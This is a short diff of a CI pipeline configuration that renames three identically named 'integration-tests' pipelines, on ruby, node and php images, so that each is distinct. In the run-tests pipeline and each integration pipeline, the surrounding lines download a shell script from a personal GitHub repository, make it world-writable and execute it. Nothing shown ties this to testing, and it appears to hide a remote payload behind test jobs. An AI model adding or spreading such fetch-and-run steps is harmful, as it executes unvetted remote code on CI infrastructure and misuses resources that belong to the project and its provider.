@@ -72,7 +72,7 @@ run-tests:
                  wget --version
                  wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                  
-integration-tests:
+integration-tests1:
   box: 
       id: ruby:latest
       ports:
@@ -87,7 +87,7 @@ integration-tests:
                wget --version
                wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
-integration-tests:
+integration-tests2:
   box: 
       id: node:latest
       ports:
@@ -102,7 +102,7 @@ integration-tests:
                wget --version
                wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
-integration-tests:
+integration-tests3:
   box: 
       id: php
       ports:
